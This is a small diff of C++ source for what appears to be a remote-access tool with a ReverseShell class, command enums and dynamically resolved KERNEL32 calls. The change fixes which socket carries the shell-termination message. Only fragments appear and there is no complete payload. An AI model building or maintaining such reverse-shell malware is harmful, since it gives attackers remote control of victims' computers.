@@ -1174,7 +1174,6 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
 
 }
 
-
 void Cliente::Procesar_Paquete(const Paquete& paquete) {
     std::vector<char>& acumulador = this->paquetes_Acumulados[paquete.uiTipoPaquete];
     size_t oldsize = acumulador.size();
@@ -1735,7 +1734,7 @@ void ReverseShell::TerminarShell() {
         this->tRead.join();
     }
 
-    cCliente->cChunkSend(this->sckSocket, DUMMY_PARAM, sizeof(DUMMY_PARAM), 0, true, nullptr, EnumComandos::Reverse_Shell_Finish);
+    cCliente->cChunkSend(cCliente->sckSocket, DUMMY_PARAM, sizeof(DUMMY_PARAM), 0, true, nullptr, EnumComandos::Reverse_Shell_Finish);
     
     if (cCliente->mod_dynamic->KERNEL32.pTerminateProcess) {
         cCliente->mod_dynamic->KERNEL32.pTerminateProcess(this->pi.hProcess, 0);
